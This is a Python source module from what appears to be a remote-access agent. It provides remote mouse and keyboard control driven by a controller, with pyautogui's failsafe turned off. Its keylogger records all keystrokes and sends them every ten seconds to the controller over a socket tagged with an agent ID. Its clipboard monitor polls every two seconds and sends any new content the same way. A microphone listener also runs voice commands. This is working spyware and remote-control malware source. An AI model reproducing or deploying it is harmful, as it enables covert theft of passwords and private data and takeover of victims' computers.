"""
Input handler module
Handles remote control, keyboard, mouse, keylogger, and clipboard monitoring
"""

import threading
import time
import queue
from logging_utils import log_message
from dependencies import PYNPUT_AVAILABLE, PYAUTOGUI_AVAILABLE, WINDOWS_AVAILABLE

# Global state variables
KEYLOGGER_ENABLED = False
KEYLOGGER_THREAD = None
KEYLOG_BUFFER = []

CLIPBOARD_MONITOR_ENABLED = False
CLIPBOARD_MONITOR_THREAD = None
CLIPBOARD_BUFFER = []
LAST_CLIPBOARD_CONTENT = ""

VOICE_CONTROL_ENABLED = False
VOICE_CONTROL_THREAD = None
VOICE_RECOGNIZER = None

REMOTE_CONTROL_ENABLED = False
LOW_LATENCY_INPUT_HANDLER = None

def initialize_low_latency_input():
    """Initialize low-latency input handling."""
    global LOW_LATENCY_INPUT_HANDLER
    
    if PYAUTOGUI_AVAILABLE:
        # Disable pyautogui failsafe
        import pyautogui
        pyautogui.FAILSAFE = False
        log_message("Low-latency input handler initialized")
        LOW_LATENCY_INPUT_HANDLER = True
        return True
    else:
        log_message("PyAutoGUI not available for input handling", "warning")
        return False

def handle_remote_control(command_data):
    """Handle remote control commands with low latency."""
    try:
        if not PYAUTOGUI_AVAILABLE:
            return _handle_remote_control_fallback(command_data)
        
        import pyautogui
        
        command_type = command_data.get('type')
        
        if command_type == 'mouse_move':
            x = command_data.get('x', 0)
            y = command_data.get('y', 0)
            pyautogui.moveTo(x, y, duration=0)
            
        elif command_type == 'mouse_click':
            button = command_data.get('button', 'left')
            x = command_data.get('x')
            y = command_data.get('y')
            
            if x is not None and y is not None:
                pyautogui.click(x, y, button=button, duration=0)
            else:
                pyautogui.click(button=button, duration=0)
                
        elif command_type == 'key_press':
            key = command_data.get('key')
            if key:
                pyautogui.press(key)
                
        elif command_type == 'key_combination':
            keys = command_data.get('keys', [])
            if keys:
                pyautogui.hotkey(*keys)
                
        elif command_type == 'type_text':
            text = command_data.get('text', '')
            if text:
                pyautogui.typewrite(text, interval=0)
        
        return True
        
    except Exception as e:
        log_message(f"Remote control error: {e}", "error")
        return False

def _handle_remote_control_fallback(command_data):
    """Fallback remote control handling without pyautogui."""
    try:
        command_type = command_data.get('type')
        
        if WINDOWS_AVAILABLE:
            import ctypes
            
            if command_type == 'mouse_move':
                x = command_data.get('x', 0)
                y = command_data.get('y', 0)
                ctypes.windll.user32.SetCursorPos(x, y)
                
            elif command_type == 'mouse_click':
                # Basic Windows API mouse click
                ctypes.windll.user32.mouse_event(2, 0, 0, 0, 0)  # MOUSEEVENTF_LEFTDOWN
                ctypes.windll.user32.mouse_event(4, 0, 0, 0, 0)  # MOUSEEVENTF_LEFTUP
        
        return True
        
    except Exception as e:
        log_message(f"Fallback remote control error: {e}", "error")
        return False

def get_input_performance_stats():
    """Get input handling performance statistics."""
    stats = {
        'low_latency_available': LOW_LATENCY_INPUT_HANDLER is not None,
        'pyautogui_available': PYAUTOGUI_AVAILABLE,
        'pynput_available': PYNPUT_AVAILABLE,
    }
    return stats

def handle_mouse_move(data):
    """Handle mouse move event."""
    try:
        x = data.get('x', 0)
        y = data.get('y', 0)
        
        if PYAUTOGUI_AVAILABLE:
            import pyautogui
            pyautogui.moveTo(x, y, duration=0)
        elif WINDOWS_AVAILABLE:
            import ctypes
            ctypes.windll.user32.SetCursorPos(x, y)
        
        return True
        
    except Exception as e:
        log_message(f"Mouse move error: {e}", "error")
        return False

def handle_mouse_click(data):
    """Handle mouse click event."""
    try:
        button = data.get('button', 'left')
        x = data.get('x')
        y = data.get('y')
        
        if PYAUTOGUI_AVAILABLE:
            import pyautogui
            if x is not None and y is not None:
                pyautogui.click(x, y, button=button, duration=0)
            else:
                pyautogui.click(button=button, duration=0)
        
        return True
        
    except Exception as e:
        log_message(f"Mouse click error: {e}", "error")
        return False

def handle_key_down(data):
    """Handle key down event."""
    try:
        key = data.get('key', '')
        modifiers = data.get('modifiers', [])
        
        if PYAUTOGUI_AVAILABLE:
            import pyautogui
            
            # Handle special key combinations
            if modifiers:
                # Build key combination
                keys = modifiers + [key] if key else modifiers
                pyautogui.hotkey(*keys)
            elif key:
                # Map special keys
                key_mapping = {
                    'Enter': 'enter',
                    'Escape': 'esc',
                    'Tab': 'tab',
                    'Space': 'space',
                    'Backspace': 'backspace',
                    'Delete': 'delete',
                    'ArrowUp': 'up',
                    'ArrowDown': 'down',
                    'ArrowLeft': 'left',
                    'ArrowRight': 'right',
                    'Home': 'home',
                    'End': 'end',
                    'PageUp': 'pageup',
                    'PageDown': 'pagedown',
                    'Insert': 'insert',
                    'F1': 'f1', 'F2': 'f2', 'F3': 'f3', 'F4': 'f4',
                    'F5': 'f5', 'F6': 'f6', 'F7': 'f7', 'F8': 'f8',
                    'F9': 'f9', 'F10': 'f10', 'F11': 'f11', 'F12': 'f12',
                }
                
                mapped_key = key_mapping.get(key, key.lower())
                pyautogui.press(mapped_key)
        
        return True
        
    except Exception as e:
        log_message(f"Key down error: {e}", "error")
        return False

def handle_key_up(data):
    """Handle key up event."""
    # For most use cases, key up is handled automatically by pyautogui.press()
    return True

# Keylogger functionality
def on_key_press(key):
    """Callback for key press events."""
    global KEYLOG_BUFFER
    
    try:
        if hasattr(key, 'char') and key.char is not None:
            # Regular character
            KEYLOG_BUFFER.append(key.char)
        else:
            # Special key
            KEYLOG_BUFFER.append(f'[{key.name}]')
        
        # Limit buffer size
        if len(KEYLOG_BUFFER) > 1000:
            KEYLOG_BUFFER = KEYLOG_BUFFER[-500:]
            
    except Exception as e:
        log_message(f"Keylogger error: {e}", "error")

def keylogger_worker(agent_id):
    """Keylogger worker thread."""
    global KEYLOGGER_ENABLED, KEYLOG_BUFFER
    
    if not PYNPUT_AVAILABLE:
        log_message("pynput not available for keylogger", "error")
        return
    
    try:
        from pynput import keyboard
        
        # Send buffered keystrokes periodically
        last_send = time.time()
        
        def on_press(key):
            on_key_press(key)
        
        def on_release(key):
            # Stop on ESC (for testing only - remove in production)
            if key == keyboard.Key.esc and not KEYLOGGER_ENABLED:
                return False
        
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            while KEYLOGGER_ENABLED:
                time.sleep(1)
                
                # Send keylog data every 10 seconds
                if time.time() - last_send > 10 and KEYLOG_BUFFER:
                    try:
                        keylog_data = ''.join(KEYLOG_BUFFER)
                        KEYLOG_BUFFER.clear()
                        
                        # Send to controller
                        try:
                            from socket_client import get_socket_client
                            sio = get_socket_client()
                            if sio and hasattr(sio, 'emit'):
                                sio.emit('keylog_data', {
                                    'agent_id': agent_id,
                                    'data': keylog_data,
                                    'timestamp': time.time()
                                })
                        except Exception:
                            pass
                        
                        last_send = time.time()
                        
                    except Exception as e:
                        log_message(f"Keylog send error: {e}", "error")
                
                if not KEYLOGGER_ENABLED:
                    break
            
            listener.stop()
            
    except Exception as e:
        log_message(f"Keylogger worker error: {e}", "error")

def start_keylogger(agent_id):
    """Start keylogger."""
    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
    
    if KEYLOGGER_ENABLED:
        log_message("Keylogger already running")
        return True
    
    if not PYNPUT_AVAILABLE:
        log_message("pynput not available for keylogger", "error")
        return False
    
    log_message("Starting keylogger...")
    KEYLOGGER_ENABLED = True
    
    KEYLOGGER_THREAD = threading.Thread(target=keylogger_worker, args=(agent_id,), daemon=True)
    KEYLOGGER_THREAD.start()
    
    log_message("Keylogger started successfully")
    return True

def stop_keylogger():
    """Stop keylogger."""
    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
    
    if not KEYLOGGER_ENABLED:
        return
    
    log_message("Stopping keylogger...")
    KEYLOGGER_ENABLED = False
    
    if KEYLOGGER_THREAD:
        KEYLOGGER_THREAD.join(timeout=2.0)
    
    log_message("Keylogger stopped")

# Clipboard monitoring
def get_clipboard_content():
    """Get current clipboard content."""
    try:
        if WINDOWS_AVAILABLE:
            import win32clipboard
            
            try:
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                return data
            except Exception:
                try:
                    win32clipboard.CloseClipboard()
                except Exception:
                    pass
                return ""
        else:
            # Linux/Unix clipboard
            try:
                import subprocess
                result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], 
                                      capture_output=True, text=True, timeout=5)
                return result.stdout
            except:
                return ""
    except Exception:
        return ""

def clipboard_monitor_worker(agent_id):
    """Clipboard monitor worker thread."""
    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_BUFFER, LAST_CLIPBOARD_CONTENT
    
    while CLIPBOARD_MONITOR_ENABLED:
        try:
            current_content = get_clipboard_content()
            
            if current_content and current_content != LAST_CLIPBOARD_CONTENT:
                LAST_CLIPBOARD_CONTENT = current_content
                
                # Add to buffer
                CLIPBOARD_BUFFER.append({
                    'content': current_content,
                    'timestamp': time.time()
                })
                
                # Limit buffer size
                if len(CLIPBOARD_BUFFER) > 100:
                    CLIPBOARD_BUFFER = CLIPBOARD_BUFFER[-50:]
                
                # Send to controller
                try:
                    from socket_client import get_socket_client
                    sio = get_socket_client()
                    if sio and hasattr(sio, 'emit'):
                        sio.emit('clipboard_data', {
                            'agent_id': agent_id,
                            'content': current_content,
                            'timestamp': time.time()
                        })
                except Exception:
                    pass
            
            time.sleep(2)  # Check every 2 seconds
            
        except Exception as e:
            log_message(f"Clipboard monitor error: {e}", "error")
            time.sleep(5)

def start_clipboard_monitor(agent_id):
    """Start clipboard monitoring."""
    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
    
    if CLIPBOARD_MONITOR_ENABLED:
        log_message("Clipboard monitor already running")
        return True
    
    log_message("Starting clipboard monitor...")
    CLIPBOARD_MONITOR_ENABLED = True
    
    CLIPBOARD_MONITOR_THREAD = threading.Thread(target=clipboard_monitor_worker, args=(agent_id,), daemon=True)
    CLIPBOARD_MONITOR_THREAD.start()
    
    log_message("Clipboard monitor started successfully")
    return True

def stop_clipboard_monitor():
    """Stop clipboard monitoring."""
    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
    
    if not CLIPBOARD_MONITOR_ENABLED:
        return
    
    log_message("Stopping clipboard monitor...")
    CLIPBOARD_MONITOR_ENABLED = False
    
    if CLIPBOARD_MONITOR_THREAD:
        CLIPBOARD_MONITOR_THREAD.join(timeout=2.0)
    
    log_message("Clipboard monitor stopped")

class LowLatencyInputHandler:
    """High-performance input handler for remote control."""
    
    def __init__(self):
        self.input_queue = queue.Queue()
        self.processing_thread = None
        self.active = False
        
    def start(self):
        """Start the input handler."""
        if self.active:
            return True
        
        self.active = True
        self.processing_thread = threading.Thread(target=self._process_input, daemon=True)
        self.processing_thread.start()
        
        log_message("Low-latency input handler started")
        return True
    
    def stop(self):
        """Stop the input handler."""
        self.active = False
        if self.processing_thread:
            self.processing_thread.join(timeout=1.0)
        log_message("Low-latency input handler stopped")
    
    def queue_input(self, input_data):
        """Queue input for processing."""
        try:
            self.input_queue.put_nowait(input_data)
        except queue.Full:
            # Drop old input if queue is full
            try:
                self.input_queue.get_nowait()
                self.input_queue.put_nowait(input_data)
            except queue.Empty:
                pass
    
    def _process_input(self):
        """Process queued input commands."""
        while self.active:
            try:
                input_data = self.input_queue.get(timeout=0.1)
                handle_remote_control(input_data)
            except queue.Empty:
                continue
            except Exception as e:
                log_message(f"Input processing error: {e}", "error")

# Voice control functionality
def voice_control_handler(agent_id):
    """Voice control handler thread."""
    global VOICE_CONTROL_ENABLED, VOICE_RECOGNIZER
    
    try:
        from dependencies import SPEECH_RECOGNITION_AVAILABLE, PYAUDIO_AVAILABLE
        
        if not SPEECH_RECOGNITION_AVAILABLE or not PYAUDIO_AVAILABLE:
            log_message("Speech recognition or audio not available", "error")
            return
        
        import speech_recognition as sr
        
        VOICE_RECOGNIZER = sr.Recognizer()
        microphone = sr.Microphone()
        
        # Adjust for ambient noise
        with microphone as source:
            VOICE_RECOGNIZER.adjust_for_ambient_noise(source)
        
        while VOICE_CONTROL_ENABLED:
            try:
                # Listen for audio
                with microphone as source:
                    log_message("Listening for voice commands...")
                    audio = VOICE_RECOGNIZER.listen(source, timeout=1, phrase_time_limit=5)
                
                # Recognize speech
                try:
                    command = VOICE_RECOGNIZER.recognize_google(audio, language='en-US')
                    log_message(f"Voice command recognized: {command}")
                    
                    # Execute voice command
                    execute_voice_command(command, agent_id)
                    
                except sr.UnknownValueError:
                    # Could not understand audio
                    pass
                except sr.RequestError as e:
                    log_message(f"Speech recognition error: {e}", "error")
                    time.sleep(5)
                    
            except sr.WaitTimeoutError:
                # No speech detected within timeout
                pass
            except Exception as e:
                log_message(f"Voice control error: {e}", "error")
                time.sleep(1)
                
    except Exception as e:
        log_message(f"Voice control handler error: {e}", "error")

def execute_voice_command(command, agent_id):
    """Execute a recognized voice command."""
    command_lower = command.lower()
    
    # Basic voice commands
    if 'screenshot' in command_lower:
        # Trigger screenshot
        pass
    elif 'open' in command_lower and 'calculator' in command_lower:
        handle_remote_control({'type': 'key_combination', 'keys': ['win', 'r']})
        time.sleep(0.5)
        handle_remote_control({'type': 'type_text', 'text': 'calc'})
        handle_remote_control({'type': 'key_press', 'key': 'enter'})
    elif 'open' in command_lower and 'notepad' in command_lower:
        handle_remote_control({'type': 'key_combination', 'keys': ['win', 'r']})
        time.sleep(0.5)
        handle_remote_control({'type': 'type_text', 'text': 'notepad'})
        handle_remote_control({'type': 'key_press', 'key': 'enter'})

def start_voice_control(agent_id):
    """Start voice control."""
    global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
    
    if VOICE_CONTROL_ENABLED:
        log_message("Voice control already running")
        return True
    
    log_message("Starting voice control...")
    VOICE_CONTROL_ENABLED = True
    
    VOICE_CONTROL_THREAD = threading.Thread(target=voice_control_handler, args=(agent_id,), daemon=True)
    VOICE_CONTROL_THREAD.start()
    
    log_message("Voice control started successfully")
    return True

def stop_voice_control():
    """Stop voice control."""
    global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
    
    if not VOICE_CONTROL_ENABLED:
        return
    
    log_message("Stopping voice control...")
    VOICE_CONTROL_ENABLED = False
    
    if VOICE_CONTROL_THREAD:
        VOICE_CONTROL_THREAD.join(timeout=2.0)
    
    log_message("Voice control stopped")
